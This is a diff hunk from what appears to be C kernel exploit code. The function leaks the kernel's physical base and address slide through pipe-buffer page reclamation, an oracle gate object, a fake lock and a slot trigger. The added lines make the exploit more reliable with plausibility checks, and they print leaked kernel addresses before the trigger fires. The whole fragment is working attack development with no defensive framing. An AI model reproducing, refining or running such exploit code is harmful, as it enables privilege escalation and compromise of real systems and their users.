@@ -720,10 +720,31 @@ static int slide_leak_physical_base(void) {
     pr_error("p0 physical pipe preparation failed\n");
     return 0;
   }
+  if (!is_plausible_reclaim_base(pipebuf_page_base)) {
+    pr_error("p0 physical abort: bad pipebuf_page_base=%016zx\n",
+             pipebuf_page_base);
+    return 0;
+  }
+  uintptr_t gate_target =
+      pipebuf_page_base +
+      (uintptr_t)P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
+  pr_info("p0 physical pre-mm pipebuf=%016zx gate_target=%016zx\n",
+          pipebuf_page_base, gate_target);
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
   if (!page_base) {
     return 0;
   }
+  if (!is_plausible_reclaim_base(page_base) ||
+      !is_plausible_reclaim_base(pipebuf_page_base)) {
+    pr_error("p0 physical abort before PI mm=%016zx pipebuf=%016zx\n",
+             page_base, pipebuf_page_base);
+    return 0;
+  }
+  pr_info("p0 physical pre-PI mm=%016zx page_struct=%016zx "
+          "oracle_parent=%016zx oracle_target=%016zx fake_lock=%016zx "
+          "delta=%lld\n",
+          page_base, direct_to_page(page_base), slide_oracle_parent,
+          slide_oracle_target, fake_lock, (long long)g_skb_data_delta);
   if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
     pr_error("p0 physical pipe gate trigger failed\n");
     return 0;
